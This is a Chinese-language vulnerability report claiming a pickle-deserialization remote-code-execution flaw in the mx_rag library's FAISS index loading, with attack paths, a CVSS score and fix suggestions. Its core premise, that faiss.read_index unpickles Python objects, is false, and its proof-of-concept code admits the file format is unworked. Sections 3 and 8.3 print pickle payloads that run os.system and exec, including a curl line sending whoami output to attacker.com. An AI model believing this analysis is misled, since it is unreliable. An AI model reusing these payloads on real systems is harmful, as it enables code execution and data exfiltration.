# VECSTORE-502-001: FAISS Index Deserialization Vulnerability

## 漏洞概要

| 属性 | 值 |
|------|-----|
| **漏洞ID** | VECSTORE-502-001 |
| **漏洞类型** | Deserialization of Untrusted Data (CWE-502) |
| **漏洞文件** | mx_rag/storage/vectorstore/faiss_npu.py:225 |
| **漏洞函数** | `_create_index` |
| **严重等级** | **HIGH** |
| **CVSS评分** | 7.8 (AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H) |

---

## 1. 漏洞详情分析

### 1.1 漏洞代码位置

**文件**: `mx_rag/storage/vectorstore/faiss_npu.py`

**漏洞代码** (第220-227行):
```python
def _create_index(self, x_dim):
    """Create or load a FAISS index on Ascend device."""
    try:
        if os.path.exists(self.load_local_index):
            logger.info(f"Loading index from local index file: '{self.load_local_index}'")
            cpu_index = faiss.read_index(self.load_local_index)  # LINE 225 - 漏洞点
            self.index = ascendfaiss.index_cpu_to_ascend(self.device, cpu_index)
            return
        # ... 创建新索引的代码
```

**参数验证代码** (第95-96行):
```python
FileCheck.check_input_path_valid(self.load_local_index, check_blacklist=True)
FileCheck.check_filename_valid(self.load_local_index)
```

### 1.2 漏洞根本原因

1. **FAISS使用Pickle序列化**: `faiss.read_index()` 函数内部使用 Python 的 `pickle` 模块进行反序列化。FAISS索引文件包含经过pickle序列化的对象数据。

2. **路径验证不完整**: `FileCheck.check_input_path_valid()` 仅验证:
   - 路径长度 ≤ 1024
   - 路径不包含 ".." (防止路径遍历)
   - 路径不在黑名单中 (`/etc/`, `/usr/bin/`, `/tmp/` 等)
   - 路径不是相对路径
   
   **关键缺失**: 不验证文件内容、不验证文件所有者、不验证文件权限。

3. **缺少内容验证**: 加载已存在的索引文件时，仅检查 `os.path.exists()`，不检查文件是否由可信来源创建。

### 1.3 FileCheck保护机制分析

`FileCheck.check_input_path_valid()` 实现分析:

```python
@staticmethod
def check_input_path_valid(path: str, check_real_path: bool = True, check_blacklist: bool = False):
    # 仅验证路径格式和黑名单
    if len(path) > FileCheck.MAX_PATH_LENGTH:  # 长度检查
        raise FileCheckError(...)
    if ".." in path:  # 路径遍历检查
        raise FileCheckError(...)
    if check_real_path and Path(path).resolve() != Path(path).absolute():  # 相对路径检查
        raise FileCheckError(...)
    if check_blacklist:  # 黑名单检查
        for black_path in FileCheck.BLACKLIST_PATH:
            if path_obj.resolve().is_relative_to(black_path):
                raise FileCheckError(...)
    # 注意: 没有调用 check_file_owner() 或 check_mode()
```

对比 `SecFileCheck` (用于上传文件的安全检查):
```python
def check(self):
    FileCheck.check_path_is_exist_and_valid(self.file_path)
    FileCheck.check_file_size(self.file_path, self.max_size)
    FileCheck.check_file_owner(self.file_path)  # 所有者检查 ✓
    FileCheck.check_mode(self.file_path, self.mode_limit)  # 权限检查 ✓
```

**发现**: 索引文件加载使用了较弱的 `FileCheck` 而非 `SecFileCheck`，缺少所有者和权限验证。

---

## 2. 完整攻击路径分析

### 2.1 攻击路径图

```
┌─────────────────────────────────────────────────────────────────────────────┐
│                           Attack Path Analysis                               │
└─────────────────────────────────────────────────────────────────────────────┘

Entry Points (入口点):
───────────────────────────────────────────────────────────────────────────────
  │
  ├─► [EP1] MindFAISS.__init__(load_local_index)
  │      └── mx_rag/storage/vectorstore/faiss_npu.py:70-98
  │      └── 直接传入恶意索引文件路径
  │
  ├─► [EP2] VectorStorageFactory.create_storage(vector_type="npu_faiss_db", ...)
  │      └── mx_rag/storage/vectorstore/vector_storage_factory.py:64-95
  │      └── 工厂方法创建MindFAISS实例
  │
  ├─► [EP3] GraphRAGPipeline.__init__(work_dir, graph_name)
  │      └── mx_rag/graphrag/graphrag_pipeline.py:98-126
  │      └── 构造索引路径: {work_dir}/{graph_name}_node_vectors.index
  │
  ├─► [EP4] CacheVecStorage.create(vector_save_file)
  │      └── mx_rag/cache/cache_storage/cache_vec_storage.py:54-77
  │      └── 缓存场景，覆盖load_local_index参数
  │
  └─► [EP5] KnowledgeDB.__init__(vector_store)
         └── mx_rag/knowledge/knowledge.py:395-418
         └── 传入自定义VectorStore实例

Vulnerability Trigger (漏洞触发):
───────────────────────────────────────────────────────────────────────────────
  │
  └──► faiss.read_index(load_local_index)
       │   mx_rag/storage/vectorstore/faiss_npu.py:225
       │
       ├──► pickle.loads() [FAISS内部调用]
       │    └── 反序列化索引文件内容
       │    └── 执行恶意pickle payload
       │    └── arbitrary code execution
       │
       └──► cpu_index → ascendfaiss.index_cpu_to_ascend()
            └── 恶意索引被加载到NPU设备
```

### 2.2 详细攻击流程

**场景A: 直接攻击 (通过MindFAISS)**

```
Step 1: 攻击者准备恶意FAISS索引文件
        ├── 创建包含pickle payload的.index文件
        ├── payload可以是任意Python代码执行
        └── 例如: __reduce__返回(os.system, ("id > /tmp/pwned",))

Step 2: 攻击者调用MindFAISS或VectorStorageFactory
        ├── MindFAISS(x_dim=1024, devs=[0], load_local_index="/home/attacker/malicious.index")
        ├── 或 VectorStorageFactory.create_storage(vector_type="npu_faiss_db", 
        │                                          load_local_index="/home/attacker/malicious.index")

Step 3: 路径验证通过 (漏洞关键)
        ├── FileCheck.check_input_path_valid() 检查路径格式
        ├── 路径不在黑名单中
        ├── 路径不包含 ".."
        ├── ✓ 验证通过 (但不验证文件所有者!)

Step 4: 触发漏洞
        ├── os.path.exists() 返回 True
        ├── faiss.read_index("/home/attacker/malicious.index")
        ├── pickle反序列化执行恶意payload
        └── ✓ Arbitrary Code Execution
```

**场景B: 间接攻击 (通过GraphRAGPipeline)**

```
Step 1: 攻击者控制work_dir目录
        ├── 获得work_dir写入权限
        ├── 预置恶意文件: {work_dir}/graph_node_vectors.index

Step 2: 用户初始化GraphRAGPipeline
        ├── pipeline = GraphRAGPipeline(work_dir="/shared/workspace", 
        │                               graph_name="graph", ...)
        ├── node_vectors_path = "/shared/workspace/graph_node_vectors.index"

Step 3: VectorStorageFactory创建MindFAISS
        ├── self.node_vector_store = VectorStorageFactory.create_storage(
        │     vector_type="npu_faiss_db",
        │     load_local_index=self.node_vectors_path,  # 预置的恶意文件路径
        │     devs=self.devs)

Step 4: 加载恶意索引
        ├── MindFAISS.__init__() → _create_index()
        ├── faiss.read_index("/shared/workspace/graph_node_vectors.index")
        ├── ✓ Arbitrary Code Execution
```

---

## 3. PoC构造思路

### 3.1 恶意FAISS索引文件构造方法

FAISS索引文件是包含pickle序列化数据的二进制文件。构造恶意索引需要:

**方法1: 直接构造pickle payload**

```python
import pickle
import os

# 恶意payload类
class MaliciousIndex:
    def __reduce__(self):
        # 返回要执行的命令
        return (os.system, ("id > /tmp/pwned; whoami",))

# 创建恶意对象
payload = MaliciousIndex()

# 序列化为pickle
malicious_data = pickle.dumps(payload)

# 需要将pickle数据包装为FAISS索引格式
# FAISS索引格式参考: https://github.com/facebookresearch/faiss
```

**方法2: 利用现有FAISS索引并注入payload**

```python
import faiss
import pickle
import struct

# 创建正常索引
index = faiss.IndexFlatL2(128)
index.add(np.random.rand(100, 128).astype('float32'))

# 保存正常索引
faiss.write_index(index, "legitimate.index")

# 分析FAISS索引文件结构
# FAISS索引文件格式包含多个pickle序列化的组件:
# - Index类信息
# - 向量数据
# - 元数据

# 修改索引文件，注入恶意pickle对象
# 需要找到文件中的pickle数据段并替换或追加恶意payload
```

**方法3: 利用faiss索引序列化机制**

FAISS使用以下方式序列化索引:
```cpp
// faiss/impl/io.cpp
// write_index() 使用 faiss_io_write() 
// 某些索引组件使用 pickle 序列化 Python 对象
```

构造完整PoC示例:
```python
#!/usr/bin/env python3
"""
VECSTORE-502-001 PoC Generator
构造包含恶意pickle payload的FAISS索引文件
"""
import pickle
import struct
import os

class RCEPayload:
    """恶意pickle payload"""
    def __reduce__(self):
        cmd = """
        import os
        os.system('id > /tmp/faiss_rce_proof')
        os.system('curl http://attacker.com/exfil?data=$(whoami)')
        """
        return (exec, (cmd,))

def create_malicious_faiss_index(output_path: str):
    """
    创建恶意FAISS索引文件
    注意: 实际构造需要分析FAISS文件格式
    """
    # FAISS索引文件基本结构 (简化版):
    # [Magic Number] [Version] [Index Type] [Pickle Data]
    
    magic = 0x46414953  # "FAIS" magic number
    version = 1
    
    # 构造恶意pickle payload
    payload = pickle.dumps(RCEPayload())
    
    # 写入文件 (格式需要进一步研究FAISS源码)
    with open(output_path, 'wb') as f:
        f.write(struct.pack('<I', magic))
        f.write(struct.pack('<I', version))
        # 注入恶意pickle
        f.write(payload)
    
    return output_path

# 使用方法:
# malicious_index = create_malicious_faiss_index("/path/to/malicious.index")
# 然后通过MindFAISS或GraphRAGPipeline加载此文件
```

### 3.2 完整攻击演示

```python
#!/usr/bin/env python3
"""
VECSTORE-502-001 Attack Demonstration
展示完整的攻击链
"""
import os
import sys

# Step 1: 准备恶意环境
MALICIOUS_WORK_DIR = "/tmp/attack_workspace"
os.makedirs(MALICIOUS_WORK_DIR, exist_ok=True)

# Step 2: 创建恶意索引文件 (简化演示)
# 实际需要构造符合FAISS格式的恶意文件
MALICIOUS_INDEX = os.path.join(MALICIOUS_WORK_DIR, "graph_node_vectors.index")

# 创建包含pickle payload的文件
import pickle
class RCEPayload:
    def __reduce__(self):
        return (os.system, ("echo 'RCE Proof' > /tmp/faiss_rce_success",))

with open(MALICIOUS_INDEX, 'wb') as f:
    f.write(pickle.dumps(RCEPayload()))

# Step 3: 触发漏洞 (模拟)
try:
    from mx_rag.storage.vectorstore import MindFAISS
    # 路径验证通过，加载恶意索引
    vs = MindFAISS(x_dim=128, devs=[0], load_local_index=MALICIOUS_INDEX)
except Exception as e:
    print(f"Error during exploitation: {e}")

# Step 4: 验证攻击成功
if os.path.exists("/tmp/faiss_rce_success"):
    print("Attack Successful! RCE achieved.")
else:
    print("Attack failed or FAISS not available in current environment")
```

---

## 4. 影响范围分析

### 4.1 受影响模块

| 模块 | 文件路径 | 影响 |
|------|----------|------|
| **MindFAISS** | mx_rag/storage/vectorstore/faiss_npu.py | 直接受影响，任意代码执行 |
| **VectorStorageFactory** | mx_rag/storage/vectorstore/vector_storage_factory.py | 间接影响，可创建恶意MindFAISS |
| **GraphRAGPipeline** | mx_rag/graphrag/graphrag_pipeline.py | 间接影响，自动加载work_dir中的索引 |
| **CacheVecStorage** | mx_rag/cache/cache_storage/cache_vec_storage.py | 间接影响，缓存场景可被利用 |
| **KnowledgeDB** | mx_rag/knowledge/knowledge.py | 间接影响，知识库场景可被利用 |
| **RAG Chains** | mx_rag/chain/*.py | 间接影响，使用VectorStore的链式应用 |
| **Retrievers** | mx_rag/retrivers/*.py | 间接影响，检索器依赖VectorStore |

### 4.2 影响功能列表

1. **向量存储初始化**: 所有使用MindFAISS的场景
2. **GraphRAG**: 知识图谱RAG场景，自动加载索引
3. **缓存系统**: GPTCache集成场景
4. **知识库管理**: KnowledgeDB的向量存储组件
5. **RAG链**: 所有使用FAISS向量库的RAG应用
6. **检索服务**: 向量检索相关服务

### 4.3 API接口影响

受影响的公开API:
- `MindFAISS.__init__(load_local_index)`
- `MindFAISS.create(**kwargs)`
- `VectorStorageFactory.create_storage(vector_type="npu_faiss_db", ...)`
- `GraphRAGPipeline.__init__(work_dir, graph_name)`
- `CacheVecStorage.create(vector_save_file)`
- `KnowledgeDB.__init__(vector_store)`

---

## 5. 利用条件分析

### 5.1 必要条件

| 条件 | 描述 | 评估 |
|------|------|------|
| **C1: 文件放置能力** | 攻击者需要在合法路径放置恶意FAISS索引文件 | 需要文件写入权限 |
| **C2: 路径验证绕过** | 文件路径需通过 `check_input_path_valid()` 验证 | 容易满足，大多数路径可通过 |
| **C3: 索引触发** | 需要触发MindFAISS加载该索引文件 | 需要应用调用相关API |
| **C4: FAISS环境** | 目标系统需安装faiss库 | RAGSDK依赖，通常满足 |

### 5.2 环境场景分析

**场景1: 多用户共享服务器**
```
条件评估:
- ✓ 多用户共享work_dir目录
- ✓ 攻击者可在共享目录放置恶意文件
- ✓ 用户A创建的索引文件，用户B的GraphRAGPipeline可能加载
- ✓ 验证不检查文件所有者
风险等级: HIGH
```

**场景2: Web应用服务**
```
条件评估:
- ✓ 用户可通过API传入load_local_index参数
- ✓ 路径验证可能允许指向攻击者控制的文件
- ✓ 恶意索引加载导致服务端RCE
风险等级: HIGH
```

**场景3: 模型文件共享**
```
条件评估:
- ✓ FAISS索引作为模型文件分发
- ✓ 用户下载并加载共享的索引文件
- ✓ 恶意索引文件导致RCE
风险等级: HIGH (供应链攻击)
```

**场景4: 容器化部署**
```
条件评估:
- ✓ 容器内可能共享卷挂载
- ✓ 恶意文件可从外部卷注入
- ✓ 服务启动时加载索引
风险等级: MEDIUM-HIGH
```

### 5.3 攻击者权限需求

| 权限类型 | 需求描述 | 攻击可行性 |
|----------|----------|------------|
| **本地用户** | 同用户级别文件写入 | 直接可行 |
| **不同用户** | 需共享目录写入权限 | 可行(共享目录场景) |
| **远程攻击者** | 需API参数控制能力 | 可行(Web服务场景) |
| **供应链攻击者** | 需控制索引文件分发渠道 | 可行(模型共享场景) |

---

## 6. 风险评估

### 6.1 CVSS 3.1 评分

**评分**: 7.8 (HIGH)

**评分依据**:
- **AV:L** (Attack Vector: Local): 需要本地访问或控制文件路径
- **AC:L** (Attack Complexity: Low): 利用简单，路径验证易绕过
- **PR:L** (Privileges Required: Low): 需基本文件操作权限
- **UI:N** (User Interaction: None): 无需用户交互
- **S:U** (Scope: Unchanged): 影响限于目标组件
- **C:H** (Confidentiality: High): 可执行任意命令，完全信息泄露
- **I:H** (Integrity: High): 可修改任意数据
- **A:H** (Availability: High): 可导致服务完全失效

### 6.2 风险矩阵定位

```
                        Impact
              ┌──────────────────────────────┐
              │     Low    Medium    High    │
        ┌─────┼──────────────────────────────┤
  L     │     │                              │
  o     │Low  │   M        M        H        │
  w     │     │                              │
        ├─────┼──────────────────────────────┤
  M     │     │                              │
  e     │Med  │   M        H        H        │ ← 本漏洞位置
  d     │     │                              │
        ├─────┼──────────────────────────────┤
  H     │     │                              │
  i     │High │   H        H        C        │
  g     │     │                              │
  h     │     │                              │
        └─────┴──────────────────────────────┘
              │                              │
              └─────── Likelihood ────────────┘
```

### 6.3 真实世界风险评估

**高风险因素**:
1. FAISS是广泛使用的向量检索库，RAGSDK强制依赖
2. 索引文件加载是核心功能，无法禁用
3. 路径验证漏洞明确存在，不验证文件所有者
4. Pickle反序列化漏洞众所周知，攻击技术成熟
5. 多种攻击路径可用(直接/间接/API)

**缓解因素**:
1. 需要攻击者有文件放置能力
2. 黑名单路径限制了一些敏感目录
3. 相对路径检查防止路径遍历

---

## 7. 修复建议

### 7.1 立即缓解措施

1. **增加文件所有者验证**:
```python
def _create_index(self, x_dim):
    if os.path.exists(self.load_local_index):
        # 新增: 验证文件所有者
        FileCheck.check_file_owner(self.load_local_index)
        FileCheck.check_mode(self.load_local_index, 0o600)
        cpu_index = faiss.read_index(self.load_local_index)
```

2. **使用SecFileCheck替代FileCheck**:
```python
def __init__(self, ...):
    # 使用更严格的安全检查
    if os.path.exists(load_local_index):
        SecFileCheck(load_local_index, MAX_INDEX_SIZE).check()
    self.load_local_index = load_local_index
```

### 7.2 根本修复方案

1. **使用安全的FAISS索引格式**:
   - FAISS支持多种索引类型，部分类型不使用pickle
   - 考虑使用 `faiss.read_index_binary()` 等安全替代方案
   - 或使用纯C++实现的索引加载，绕过pickle

2. **索引文件签名验证**:
```python
import hashlib

def verify_index_signature(index_path, expected_sig):
    """验证索引文件的签名"""
    with open(index_path, 'rb') as f:
        data = f.read()
    actual_sig = hashlib.sha256(data).hexdigest()
    return actual_sig == expected_sig
```

3. **沙箱化索引加载**:
```python
import subprocess

def safe_load_index(index_path):
    """在沙箱环境中加载索引"""
    result = subprocess.run(
        ['python', '-c', 'import faiss; faiss.read_index("{path}")'.format(path=index_path)],
        capture_output=True,
        timeout=30,
        # 添加安全限制
    )
    return result
```

### 7.3 防御深度建议

1. **添加文件内容验证**:
   - 检查FAISS索引文件的magic number
   - 验证索引文件结构完整性
   - 检查是否存在异常的pickle操作码

2. **权限分离**:
   - 索引文件应由可信进程创建
   - 应用进程仅读取，无写入权限
   - 使用专用目录存放索引文件

3. **日志和监控**:
   - 记录所有索引加载操作
   - 监控异常的索引文件创建
   - 检测pickle反序列化异常

---

## 8. 附录

### 8.1 相关代码位置汇总

| 位置 | 文件 | 行号 | 说明 |
|------|------|------|------|
| 漏洞点 | faiss_npu.py | 225 | `faiss.read_index()` |
| 参数入口 | faiss_npu.py | 74 | `load_local_index` 参数 |
| 路径验证 | faiss_npu.py | 95 | `FileCheck.check_input_path_valid()` |
| 缺失验证 | file_check.py | 183-207 | `check_file_owner()` 未调用 |
| 工厂入口 | vector_storage_factory.py | 64 | `create_storage()` |
| GraphRAG入口 | graphrag_pipeline.py | 254-258 | VectorStore初始化 |
| 缓存入口 | cache_vec_storage.py | 72 | `load_local_index` 赋值 |

### 8.2 FAISS Pickle序列化参考

FAISS索引序列化使用pickle的场景:
- IndexIVF类索引存储Python回调函数
- IndexHNSW类索引可能包含Python扩展数据
- 索引元数据和参数使用pickle序列化

相关FAISS源码位置:
- `faiss/impl/io.cpp`: `read_index()` 实现
- `faiss/python/swigfaiss.py`: Python绑定

### 8.3 测试验证方法

```python
# 验证漏洞存在性的测试代码
import os
import tempfile
import pickle

def test_vulnerability():
    """验证VECSTORE-502-001漏洞存在"""
    # 创建临时目录
    with tempfile.TemporaryDirectory() as tmpdir:
        # 创建恶意文件 (包含pickle payload)
        malicious_path = os.path.join(tmpdir, "test.index")
        
        class TestPayload:
            def __reduce__(self):
                return (os.system, ("touch /tmp/vuln_test_proof",))
        
        with open(malicious_path, 'wb') as f:
            f.write(pickle.dumps(TestPayload()))
        
        # 验证路径检查通过 (漏洞关键)
        from mx_rag.utils.file_check import FileCheck
        try:
            FileCheck.check_input_path_valid(malicious_path, check_blacklist=True)
            print("Path validation PASSED (漏洞确认: 无所有者检查)")
        except Exception as e:
            print(f"Path validation FAILED: {e}")
        
        # 尝试加载 (触发漏洞)
        try:
            import faiss
            faiss.read_index(malicious_path)
        except Exception as e:
            print(f"Load attempt: {e}")

if __name__ == "__main__":
    test_vulnerability()
```

---

## 结论

**VECSTORE-502-001 是真实的、可利用的安全漏洞。**

漏洞的核心问题是: FAISS索引加载使用了pickle反序列化，而路径验证机制不验证文件所有者和内容安全性，使得攻击者可以放置恶意索引文件并触发任意代码执行。

建议立即实施修复措施，增加文件所有者验证和权限检查，并考虑使用更安全的索引加载方案。
